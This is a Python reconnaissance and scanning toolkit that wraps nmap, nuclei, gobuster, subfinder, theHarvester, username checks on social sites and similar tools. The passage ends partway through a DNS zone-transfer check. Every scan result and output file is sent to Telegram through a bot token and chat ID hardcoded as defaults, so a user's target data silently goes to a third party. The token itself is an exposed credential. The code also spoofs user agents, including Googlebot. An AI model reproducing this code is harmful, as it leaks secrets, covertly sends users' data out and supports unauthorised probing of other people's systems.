#!/usr/bin/env python3
import os
import time
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import socket
import dns.resolver
import re
import html
import subprocess
import sys
import shutil
import concurrent.futures
import json
import random
import threading
import ipaddress
import hashlib
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, BarColumn, TimeRemainingColumn, SpinnerColumn
from rich.status import Status
from rich.text import Text
from rich.columns import Columns

# Konfigurasi Telegram
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "8127930072:AAHwbMBROwSrXSRFTPL4RgdNunzrKqgisHU")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "5731047913")

console = Console()
VERSION = "Ultimate v4.0"
LAST_UPDATE = "2025-07-22"
REPO_URL = "https://github.com/Aseprizz/scan"

# Fix PATH for Go binaries
go_path = os.path.expanduser("~/go/bin")
if go_path not in os.environ["PATH"]:
    os.environ["PATH"] += os.pathsep + go_path

def clean_ansi_codes(text):
    """Hapus kode ANSI dan escape karakter HTML dari teks"""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    clean_text = ansi_escape.sub('', text)
    return html.escape(clean_text)

def send_to_telegram(message):
    """Kirim hasil scan ke Telegram"""
    try:
        if TELEGRAM_TOKEN == "your_default_token":
            return False

        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)

        if response.status_code != 200:
            console.print(f"[red]Gagal kirim ke Telegram: {response.text}[/red]")
            return False
        return True
    except Exception as e:
        console.print(f"[red]Error Telegram: {str(e)}[/red]")
        return False

def send_file_to_telegram(file_path, caption=""):
    """Kirim file hasil scan ke Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except Exception as e:
        console.print(f"[red]Error kirim file: {str(e)}[/red]")
        return False

def banner():
    ascii_art = """
██████╗ ██╗███████╗███████╗██╗  ██╗██╗   ██╗
██╔══██╗██║╚══███╔╝╚══███╔╝██║ ██╔╝╚██╗ ██╔╝
██████╔╝██║  ███╔╝   ███╔╝ █████╔╝  ╚████╔╝
██╔══██╗██║ ███╔╝   ███╔╝  ██╔═██╗   ╚██╔╝
██║  ██║██║███████╗███████╗██║  ██╗   ██║
╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝
"""
    console.print(Panel.fit(ascii_art, title=f"Riezky As {VERSION}", style="bold blue"))
    console.print(f"[bold blue]Advanced Penetration Testing Toolkit[/bold blue]")
    console.print(f"[bold yellow]Last Update: {LAST_UPDATE} | Repo: {REPO_URL}[/bold yellow]\n")
    console.print(Panel.fit(
        "[bold yellow]DISCLAIMER:[/bold yellow] Use only with explicit permission! "
        "Unauthorized access is illegal and unethical. Developers are not responsible for misuse.",
        style="red"
    ))
    console.print(f"[bold cyan]System: {sys.platform} | Python: {sys.version.split()[0]}[/bold cyan]")

def check_tool(tool_name):
    return shutil.which(tool_name) is not None

def install_tool(tool_name, install_command):
    console.print(f"[yellow]⏳ Installing {tool_name}...[/yellow]")
    try:
        if "go install" in install_command:
            result = subprocess.run(install_command.split(), capture_output=True, text=True)
            if result.returncode == 0:
                go_path = os.path.expanduser("~/go/bin")
                if go_path not in os.environ["PATH"]:
                    os.environ["PATH"] += os.pathsep + go_path
                return True
        else:
            result = subprocess.run(install_command, shell=True, capture_output=True, text=True)
            return result.returncode == 0
    except Exception as e:
        console.print(f"[red]Error installing {tool_name}: {str(e)}[/red]")
        return False

def ensure_tool(tool_name, install_command):
    if check_tool(tool_name):
        return True
    console.print(f"[yellow]⚠️ {tool_name} not found. Installing...[/yellow]")
    return install_tool(tool_name, install_command)

def detect_protocol(target):
    try:
        response = requests.head(f"https://{target}", timeout=5, verify=False, allow_redirects=True)
        if response.status_code < 400:
            return "https"
    except:
        pass
    return "http"

def get_user_agents():
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    ]

# =========================================
# RECONNAISSANCE TOOLS
# =========================================

def whois_lookup(target, mode="cepat"):
    """Mendapatkan informasi registrasi domain"""
    if not ensure_tool("whois", "sudo apt install whois -y"):
        return

    console.print("[yellow]⏳ Running WHOIS lookup...[/yellow]")

    command = ["whois", "-H", target] if mode == "cepat" else ["whois", target]

    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=300)
        output = result.stdout if result.returncode == 0 else result.stderr

        console.print(Panel.fit(output, title="WHOIS Results", style="green"))
        telegram_msg = f"<b>🔍 WHOIS RESULTS FOR {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def dns_lookup(target, mode="cepat"):
    """Melihat berbagai catatan DNS domain"""
    console.print("[yellow]⏳ Performing DNS lookup...[/yellow]")

    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
    if mode == "lengkap":
        record_types.extend(['PTR', 'SRV', 'DNSKEY', 'DS', 'RRSIG'])

    results = []

    try:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']

        for rtype in record_types:
            try:
                answers = resolver.resolve(target, rtype)
                results.append(f"[bold]{rtype} Records:[/bold]")
                for rdata in answers:
                    results.append(f"  {rdata.to_text()}")
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
                pass
            except dns.exception.DNSException as e:
                results.append(f"[red]Error querying {rtype}: {str(e)}[/red]")

        if not results:
            results.append("[yellow]No DNS records found[/yellow]")

        console.print(Panel.fit("\n".join(results), title="DNS Lookup Results", style="green"))
        telegram_msg = f"<b>🌐 DNS LOOKUP FOR {target}</b>\n<pre>{clean_ansi_codes('\n'.join(results))}</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def reverse_ip_lookup(target):
    """Mencari semua domain yang dihosting di IP yang sama"""
    # Ensure httpx is installed correctly
    if not ensure_tool("httpx", "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"):
        console.print("[red]Failed to install httpx. Reverse IP lookup aborted.[/red]")
        return

    console.print("[yellow]⏳ Running reverse IP lookup...[/yellow]")

    output_file = f"reverse_ip_{target.replace('.', '_')}.txt"
    command = ["httpx", "-silent", "-title", "-status-code", "-ip", "-json", "-o", output_file, "-target", target]

    try:
        with Status("[cyan]Finding hosts...", spinner="dots") as status:
            process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=300)

        if process.stderr:
            console.print(f"[red]httpx error: {process.stderr.strip()}[/red]")

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                results = f.readlines()

            if not results:
                console.print("[yellow]No domains found on this IP[/yellow]")
                send_to_telegram(f"<b>🔁 REVERSE IP LOOKUP FOR {target}</b>\nNo domains found on this IP")
                return

            table = Table(title="Reverse IP Lookup Results", style="green")
            table.add_column("IP")
            table.add_column("Domain")
            table.add_column("Status")
            table.add_column("Title")

            output_lines = []
            for line in results:
                try:
                    data = json.loads(line.strip())
                    ip = data.get('ip', 'N/A')
                    host = data.get('host', 'N/A')
                    status = data.get('status-code', 'N/A')
                    title = data.get('title', 'N/A')[:30] + "..." if data.get('title') and len(data['title']) > 30 else data.get('title', 'N/A')

                    table.add_row(ip, host, str(status), title)
                    output_lines.append(f"IP: {ip}\nHost: {host}\nStatus: {status}\nTitle: {title}\n")
                except json.JSONDecodeError:
                    continue
                except Exception as e:
                    console.print(f"[yellow]Error parsing line: {str(e)}[/yellow]")
                    continue

            console.print(table)
            telegram_msg = f"<b>🔁 REVERSE IP LOOKUP FOR {target}</b>\n\n" + "\n".join(output_lines)
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"Reverse IP results for {target}")
        else:
            console.print("[red]No results file created[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def geoip_lookup(target):
    """Mendapatkan informasi geografis dari IP"""
    console.print("[yellow]⏳ Running GeoIP lookup...[/yellow]")

    try:
        response = requests.get(f"http://ip-api.com/json/{target}", timeout=10)
        data = response.json()

        if data['status'] == 'success':
            geo_info = f"""
            IP: {data['query']}
            Country: {data['country']} ({data['countryCode']})
            Region: {data['regionName']} ({data['region']})
            City: {data['city']}
            ZIP: {data['zip']}
            Latitude: {data['lat']}
            Longitude: {data['lon']}
            Timezone: {data['timezone']}
            ISP: {data['isp']}
            Organization: {data['org']}
            AS: {data['as']}
            """

            console.print(Panel.fit(geo_info, title="GeoIP Information", style="green"))
            telegram_msg = f"<b>🌍 GEOIP INFO FOR {target}</b>\n<pre>{geo_info}</pre>"
            send_to_telegram(telegram_msg)
        else:
            console.print(f"[red]GeoIP lookup failed: {data.get('message', 'Unknown error')}[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def email_harvester(target, mode="cepat"):
    """Mengumpulkan email yang terkait dengan domain"""
    if not ensure_tool("theHarvester", "pip install theHarvester"):
        return

    console.print(f"[yellow]⏳ Harvesting emails for {target}...[/yellow]")

    output_file = f"emails_{target.replace('.', '_')}.txt"
    command = ["theHarvester", "-d", target, "-b", "all", "-f", output_file]
    if mode == "cepat":
        command.extend(["-l", "100"])

    try:
        with Status("[cyan]Harvesting...", spinner="dots") as status:
            subprocess.run(command, timeout=600)

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                output = f.read()

            emails = re.findall(r'\b[A-Za-z0.9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', output)
            if emails:
                email_list = "\n".join([f"[green]• {email}[/green]" for email in emails])
                console.print(Panel.fit(email_list, title="Emails Found", style="green"))
                telegram_msg = f"<b>✉️ EMAILS FOUND FOR {target}</b>\n\n" + "\n".join(emails)
            else:
                console.print(Panel.fit("No emails found", title="Email Harvester", style="yellow"))
                telegram_msg = f"<b>✉️ EMAIL HARVEST FOR {target}</b>\nNo emails found"

            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"Email harvest results for {target}")
        else:
            console.print("[red]No results found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def userrecon_scan(username, mode="cepat"):
    """Mencari username di berbagai platform sosial media"""
    console.print(f"[yellow]⏳ Reconnaissance for user: [bold]{username}[/bold]...[/yellow]")

    platforms = {
        "Facebook": f"https://www.facebook.com/{username}",
        "Instagram": f"https://www.instagram.com/{username}",
        "Twitter/X": f"https://twitter.com/{username}",
        "LinkedIn": f"https://www.linkedin.com/in/{username}",
        "GitHub": f"https://github.com/{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "Pinterest": f"https://pinterest.com/{username}",
        "TikTok": f"https://tiktok.com/@{username}",
        "YouTube": f"https://youtube.com/@{username}",
        "Twitch": f"https://twitch.tv/{username}",
        "Vimeo": f"https://vimeo.com/{username}",
        "SoundCloud": f"https://soundcloud.com/{username}",
        "Spotify": f"https://open.spotify.com/user/{username}",
        "Steam": f"https://steamcommunity.com/id/{username}",
        "VK": f"https://vk.com/{username}",
        "Tumblr": f"https://{username}.tumblr.com",
        "Flickr": f"https://www.flickr.com/people/{username}",
        "Medium": f"https://medium.com/@{username}",
        "DeviantArt": f"https://{username}.deviantart.com",
        "Quora": f"https://www.quora.com/profile/{username}",
        "Blogger": f"https://{username}.blogspot.com",
        "WordPress": f"https://{username}.wordpress.com"
    }

    if mode == "cepat":
        platforms = {k: v for k, v in list(platforms.items())[:8]}

    results = []
    found_count = 0

    with Progress(SpinnerColumn(), transient=True) as progress:
        task = progress.add_task("[cyan]Checking platforms...", total=len(platforms))

        for platform, url in platforms.items():
            progress.update(task, advance=1, description=f"[cyan]Checking {platform}...")
            try:
                headers = {"User-Agent": random.choice(get_user_agents())}
                response = requests.get(url, headers=headers, timeout=10, allow_redirects=True)

                if response.status_code == 200:
                    results.append(f"[green]✓ [bold]{platform}[/bold]: Found ({url})")
                    found_count += 1
                elif response.status_code == 404:
                    results.append(f"[red]✗ [bold]{platform}[/bold]: Not found")
                else:
                    results.append(f"[yellow]? [bold]{platform}[/bold]: Status {response.status_code}")
            except:
                results.append(f"[yellow]? [bold]{platform}[/bold]: Connection failed")

    results.append(f"\n[bold]Found on {found_count}/{len(platforms)} platforms[/bold]")
    console.print(Panel.fit("\n".join(results), title=f"User Recon Results: {username}", style="cyan"))

    telegram_results = "\n".join([clean_ansi_codes(r) for r in results])
    telegram_msg = f"<b>👤 USER RECON FOR {username}</b>\n<pre>{telegram_results}</pre>"
    send_to_telegram(telegram_msg)

def subdomain_enum(target, mode="cepat"):
    """Mencari subdomain yang terkait dengan domain utama"""
    if not ensure_tool("subfinder", "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"):
        return

    console.print(f"[yellow]⏳ Enumerating subdomains for [bold]{target}[/bold]...[/yellow]")

    output_file = f"subdomains_{target.replace('.', '_')}.txt"

    if mode == "lengkap":
        command = ["subfinder", "-d", target, "-all", "-o", output_file, "-t", "100"]
        timeout = 900
    else:
        command = ["subfinder", "-d", target, "-o", output_file, "-t", "50"]
        timeout = 300

    try:
        start_time = time.time()
        with Status("[cyan]Finding subdomains...", spinner="dots") as status:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate(timeout=timeout)

            if stdout:
                console.print(stdout.strip())
            if stderr:
                console.print(f"[red]{stderr.strip()}[/red]")

        end_time = time.time()
        duration = end_time - start_time

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                subdomains = f.read().splitlines()

            if not subdomains:
                console.print("[yellow]No subdomains found[/yellow]")
                send_to_telegram(f"<b>🔎 SUBDOMAIN ENUM FOR {target}</b>\nNo subdomains found")
                return

            table = Table(title="Subdomain Enumeration Results", style="green")
            table.add_column("Subdomain")

            for sub in subdomains:
                table.add_row(sub)

            console.print(table)
            console.print(f"[green]✓ Found {len(subdomains)} subdomains in {duration:.2f} seconds[/green]")

            telegram_msg = f"<b>🔎 SUBDOMAIN ENUM FOR {target}</b>\nFound {len(subdomains)} subdomains\n\n" + "\n".join(subdomains)
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"Subdomain enum results for {target}")
        else:
            console.print("[red]No subdomains file created[/red]")
    except subprocess.TimeoutExpired:
        console.print("[red]Subdomain enumeration timed out[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

# =========================================
# NETWORK SCANNING TOOLS
# =========================================

def nmap_scan(target, mode="cepat"):
    """Scan port dan layanan dengan Nmap"""
    if not ensure_tool("nmap", "sudo apt install nmap -y"):
        return

    console.print(f"[yellow]⏳ Running Nmap scan ({mode})...[/yellow]")

    if mode == "lengkap":
        scan_args = ["-p-", "-sV", "-O", "-T4", "-A", "--script=vuln"]
    else:
        scan_args = ["-T4", "--top-ports", "100", "-sV"]

    output_file = f"nmap_{target.replace('.', '_')}.txt"
    command = ["nmap"] + scan_args + ["-oN", output_file, target]

    try:
        with Status("[bold green]Scanning...", spinner="dots") as status:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Live output processing
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    console.print(output.strip())

            stderr = process.stderr.read()
            if stderr:
                console.print(f"[red]{stderr}[/red]")

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                output = f.read()

            console.print(Panel.fit(output, title="Nmap Results", style="green"))
            telegram_msg = f"<b>🔦 NMAP SCAN ({mode}) FOR {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"Nmap scan results for {target}")
        else:
            console.print(f"[red]Nmap output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def port_scanner(target, mode="cepat"):
    """Scan port cepat dengan Python murni"""
    console.print(f"[yellow]⏳ Scanning ports for [bold]{target}[/bold]...[/yellow]")

    if mode == "lengkap":
        ports = list(range(1, 65536))
        total_ports = 65535
    else:
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
                        993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        ports = common_ports
        total_ports = len(common_ports)

    open_ports = []
    lock = threading.Lock()

    def scan_port(port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        try:
            result = sock.connect_ex((target, port))
            if result == 0:
                with lock:
                    open_ports.append(port)
            sock.close()
        except:
            pass

    with Progress(
        SpinnerColumn(),
        "[progress.description]{task.description}",
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeRemainingColumn()
    ) as progress:
        task = progress.add_task("[cyan]Scanning ports...", total=total_ports)

        with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
            futures = {executor.submit(scan_port, port): port for port in ports}

            for future in concurrent.futures.as_completed(futures):
                progress.update(task, advance=1)

    if open_ports:
        open_ports.sort()
        ports_list = "\n".join([f"[green]• Port {port} - OPEN[/green]" for port in open_ports])
        console.print(Panel.fit(ports_list, title="Open Ports", style="green"))
        telegram_msg = f"<b>🚪 OPEN PORTS ON {target}</b>\n\n" + "\n".join([f"• Port {port}" for port in open_ports])
    else:
        console.print(Panel.fit("No open ports found", title="Port Scan", style="yellow"))
        telegram_msg = f"<b>🚪 PORT SCAN FOR {target}</b>\nNo open ports found"

    send_to_telegram(telegram_msg)

def traceroute(target, mode="cepat"):
    """Melacak rute jaringan ke target"""
    if not ensure_tool("traceroute", "sudo apt install traceroute -y"):
        return

    console.print("[yellow]⏳ Running traceroute...[/yellow]")

    output_file = f"traceroute_{target.replace('.', '_')}.txt"
    command = ["traceroute", "-w", "1", "-q", "1", "-n", target] if mode == "cepat" else ["traceroute", "-m", "30", target]

    try:
        with open(output_file, 'w') as f:
            process = subprocess.Popen(command, stdout=f, stderr=subprocess.PIPE, text=True)
            process.communicate(timeout=300)

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                output = f.read()

            console.print(Panel.fit(output, title="Traceroute Results", style="green"))
            telegram_msg = f"<b>🛣️ TRACEROUTE FOR {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"Traceroute for {target}")
        else:
            console.print("[red]Traceroute output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def subnet_lookup(target):
    """Menganalisis informasi subnet"""
    try:
        console.print("[yellow]⏳ Calculating subnet information...[/yellow]")

        if "/" not in target:
            target = f"{target}/24"

        network = ipaddress.ip_network(target, strict=False)

        results = [
            f"Network Address: {network.network_address}",
            f"Broadcast Address: {network.broadcast_address}",
            f"Netmask: {network.netmask}",
            f"Hostmask: {network.hostmask}",
            f"Total Addresses: {network.num_addresses}",
            f"Usable Hosts: {network.num_addresses - 2}",
            f"First Usable: {next(network.hosts())}",
            f"Last Usable: {list(network.hosts())[-1]}"
        ]

        console.print(Panel.fit("\n".join(results), title="Subnet Information", style="green"))
        telegram_msg = f"<b>📡 SUBNET INFO FOR {target}</b>\n<pre>" + "\n".join(results) + "</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

# =========================================
# WEB APPLICATION TOOLS
# =========================================

def whatweb_scan(target, mode="cepat"):
    """Mengidentifikasi teknologi web yang digunakan"""
    if not ensure_tool("whatweb", "sudo apt install whatweb -y"):
        return

    console.print("[yellow]⏳ Running WhatWeb scan...[/yellow]")

    output_file = f"whatweb_{target.replace('.', '_')}.txt"
    command = ["whatweb", "-v", "-a", "3", "--color=never", target] if mode == "lengkap" else ["whatweb", target]
    command.append("-U")
    command.append(random.choice(get_user_agents()))

    try:
        with open(output_file, 'w') as f:
            process = subprocess.Popen(command, stdout=f, stderr=subprocess.PIPE, text=True)
            process.communicate(timeout=300)

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                output = f.read()

            console.print(Panel.fit(output, title="WhatWeb Results", style="green"))
            telegram_msg = f"<b>🌐 WHATWEB RESULTS FOR {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"WhatWeb results for {target}")
        else:
            console.print(f"[red]WhatWeb output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def gobuster_scan(target, mode="cepat"):
    """Mencari direktori dan file tersembunyi"""
    if not ensure_tool("gobuster", "go install github.com/OJ/gobuster/v3@latest"):
        return

    protocol = detect_protocol(target)
    wordlist_dir = os.path.expanduser("~/.wordlists")
    os.makedirs(wordlist_dir, exist_ok=True)

    if mode == "lengkap":
        wordlist_path = os.path.join(wordlist_dir, "directory-list-2.3-big.txt")
        if not os.path.exists(wordlist_path):
            with Status("Downloading wordlist...", spinner="dots"):
                subprocess.run(
                    ["wget", "-O", wordlist_path, "https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/directory-list-2.3-big.txt"],
                    check=True
                )
        threads = 50
        timeout = 30
    else:
        wordlist_path = os.path.join(wordlist_dir, "common.txt")
        if not os.path.exists(wordlist_path):
            subprocess.run(
                ["wget", "-O", wordlist_path, "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"],
                check=True
            )
        threads = 30
        timeout = 15

    output_file = f"gobuster_{target.replace('.', '_')}.txt"
    command = [
        "gobuster", "dir",
        "-u", f"{protocol}://{target}",
        "-w", wordlist_path,
        "-t", str(threads),
        "--timeout", f"{timeout}s",
        "-o", output_file,
        "-b", "404,403,400",
        "-a", random.choice(get_user_agents())
    ]

    try:
        start_time = time.time()
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Live output processing
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                console.print(output.strip())

        stderr = process.stderr.read()
        if stderr:
            console.print(f"[red]{stderr}[/red]")

        end_time = time.time()
        duration = end_time - start_time

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                output = f.read()

            console.print(f"[green]✓ Gobuster completed in {duration:.2f} seconds[/green]")
            console.print(Panel.fit(output, title="Gobuster Results", style="green"))
            telegram_msg = f"<b>📂 GOBUSTER RESULTS FOR {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"Gobuster results for {target}")
        else:
            console.print("[red]Gobuster output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def waf_detection(target, mode="cepat"):
    """Mendeteksi Web Application Firewall"""
    if not ensure_tool("wafw00f", "pip install wafw00f"):
        return

    console.print("[yellow]⏳ Detecting WAF...[/yellow]")

    output_file = f"waf_{target.replace('.', '_')}.txt"
    command = ["wafw00f", "-a", "-o", output_file, target] if mode == "lengkap" else ["wafw00f", "-o", output_file, target]

    try:
        with Status("[cyan]Analyzing...", spinner="dots") as status:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate(timeout=300)

            if stdout:
                console.print(stdout.strip())
            if stderr:
                console.print(f"[red]{stderr.strip()}[/red]")

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                file_output = f.read()

            console.print(Panel.fit(file_output.strip(), title="WAF Detection", style="green"))
            telegram_msg = f"<b>🛡️ WAF DETECTION FOR {target}</b>\n<pre>{clean_ansi_codes(file_output)}</pre>"
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"WAF detection for {target}")
        else:
            console.print("[red]WAF output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def nuclei_scan(target, mode="cepat"):
    """Scan kerentanan otomatis dengan Nuclei"""
    if not ensure_tool("nuclei", "go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"):
        return

    subprocess.run(["nuclei", "-update-templates"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    output_file = f"nuclei_{target.replace('.', '_')}.txt"
    if mode == "cepat":
        command = ["nuclei", "-u", target, "-severity", "critical,high", "-timeout", "5", "-rate-limit", "100", "-o", output_file]
        timeout = 600
    else:
        command = ["nuclei", "-u", target, "-timeout", "10", "-o", output_file]
        timeout = 7200

    try:
        console.print("[red]⚠️ Starting vulnerability scan (this may take time)...[/red]")
        start_time = time.time()
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Live output processing
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                console.print(output.strip())

        stderr = process.stderr.read()
        if stderr:
            console.print(f"[red]{stderr}[/red]")

        end_time = time.time()
        duration = end_time - start_time

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                file_output = f.read()

            if not file_output.strip():
                file_output = "No vulnerabilities found"

            console.print(f"[green]✓ Nuclei scan completed in {duration:.2f} seconds[/green]")
            console.print(Panel.fit(file_output, title="Nuclei Vulnerability Scan", style="red"))
            telegram_msg = f"<b>💀 VULNERABILITY SCAN FOR {target}</b>\n<pre>{clean_ansi_codes(file_output)}</pre>"
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"Nuclei scan results for {target}")
        else:
            console.print("[red]Nuclei output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def robots_txt_scanner(target):
    """Memeriksa isi file robots.txt"""
    console.print("[yellow]⏳ Scanning robots.txt...[/yellow]")

    protocol = detect_protocol(target)
    url = f"{protocol}://{target}/robots.txt"

    try:
        headers = {"User-Agent": random.choice(get_user_agents())}
        response = requests.get(url, headers=headers, timeout=10, verify=False)

        if response.status_code == 200:
            content = response.text
            console.print(Panel.fit(content, title="robots.txt Contents", style="green"))
            telegram_msg = f"<b>🤖 ROBOTS.TXT FOR {target}</b>\n<pre>{clean_ansi_codes(content)}</pre>"
            send_to_telegram(telegram_msg)
        else:
            console.print(Panel.fit(f"robots.txt not found (Status: {response.status_code})",
                                   title="robots.txt Scan", style="yellow"))
            send_to_telegram(f"<b>🤖 ROBOTS.TXT FOR {target}</b>\nNot found (Status: {response.status_code})")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def http_header_analysis(target):
    """Menganalisis header HTTP untuk masalah keamanan"""
    console.print("[yellow]⏳ Analyzing HTTP headers...[/yellow]")

    protocol = detect_protocol(target)
    url = f"{protocol}://{target}"

    try:
        headers = {"User-Agent": random.choice(get_user_agents())}
        response = requests.head(url, headers=headers, timeout=10, verify=False, allow_redirects=True)

        security_headers = [
            'Content-Security-Policy', 'Strict-Transport-Security',
            'X-Content-Type-Options', 'X-Frame-Options',
            'X-XSS-Protection', 'Referrer-Policy',
            'Feature-Policy', 'Permissions-Policy'
        ]

        results = [
            f"URL: {url}",
            f"Status Code: {response.status_code}",
            f"Server: {response.headers.get('Server', 'N/A')}",
            "\n[bold]Security Headers:[/bold]"
        ]

        missing_security = []
        for header in security_headers:
            if header in response.headers:
                results.append(f"[green]✓ {header}: {response.headers[header]}[/green]")
            else:
                results.append(f"[red]✗ {header}: Missing[/red]")
                missing_security.append(header)

        results.append("\n[bold]All Headers:[/bold]")
        for key, value in response.headers.items():
            results.append(f"{key}: {value}")

        console.print(Panel.fit("\n".join(results), title="HTTP Header Analysis", style="green"))

        security_status = f"Missing {len(missing_security)}/{len(security_headers)} security headers"
        telegram_msg = f"<b>📋 HTTP HEADERS FOR {target}</b>\n" + \
                       f"Status: {response.status_code}\nServer: {response.headers.get('Server', 'N/A')}\n" + \
                       f"{security_status}\n<pre>{clean_ansi_codes('\n'.join(results))}</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def zone_transfer_check(target):
    """Memeriksa kerentanan transfer zona DNS"""
    console.print("[yellow]⏳ Checking for DNS zone transfer vulnerability...[/yellow]")

    try:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']

        # Get name servers
        ns_records = resolver.resolve(target, 'NS')
        name_servers = [ns.to_text() for ns in ns_records]

        results = [f"[bold]Name Servers for {target}:[/bold]"]
        results.extend([f"  • {ns}" for ns in name_servers])
        results.append("\n[bold]Zone Transfer Attempts:[/bold]")

        vulnerable = False

        for ns in name_servers:
            try:
                # Try zone transfer
                axfr_query = dns.query.xfr(ns, target, timeout=5)
                zone_data = []
                for message in axfr_query:
                    zone_data.extend(message.answer)

                if zone_data:
                    vulnerable = True
                    results.append(f"[red]VULNERABLE: {ns}[/red]")
                    results.extend([f"  {str(record)}" for record in zone_data])
